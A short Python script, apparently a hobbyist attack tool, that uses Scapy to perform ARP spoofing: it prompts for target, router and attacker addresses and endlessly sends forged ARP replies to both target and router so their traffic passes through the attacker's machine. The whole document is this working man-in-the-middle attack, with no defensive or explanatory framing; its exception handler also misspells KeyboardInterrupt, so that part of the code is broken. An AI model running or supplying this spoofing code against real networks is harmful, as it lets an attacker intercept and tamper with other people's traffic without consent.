from scapy.all import *
from scapy.layers.l2 import ARP

target_IP = input("\t Enter Target IP : ")
target_MAC = input("\t Enter Target MAC : ")

router_IP = input("\t Enter Router IP : ")
router_MAC = input("\t Enter Router MAC : ")

attacker_MAC = input("\t Enter Attacker MAC : ")

def spoof_target():
    my_arp_response =ARP()
    
    my_arp_response.op = 2
    my_arp_response.pdst = target_IP 
    my_arp_response.hwdst = target_MAC
    my_arp_response.hwsrc = attacker_MAC
    my_arp_response.psrc = router_IP
    
    print(my_arp_response.show())
    send(my_arp_response)
    
def spoof_router(): 
    my_arp_reponse = ARP()
    my_arp_reponse.op = 2
    
    my_arp_reponse.pdst = router_IP
    my_arp_reponse.hwdst = router_MAC
    my_arp_reponse.hwsrc = attacker_MAC
    my_arp_reponse.psrc = target_IP
    
    print(my_arp_reponse.show())
    send(my_arp_reponse)

if __name__ == "__main__":
    try :
        while True:
            spoof_target()
            spoof_router()
    except keyboardInterrupt as e:
        print("Program is Terminate and Ran Successfully......!!!")
    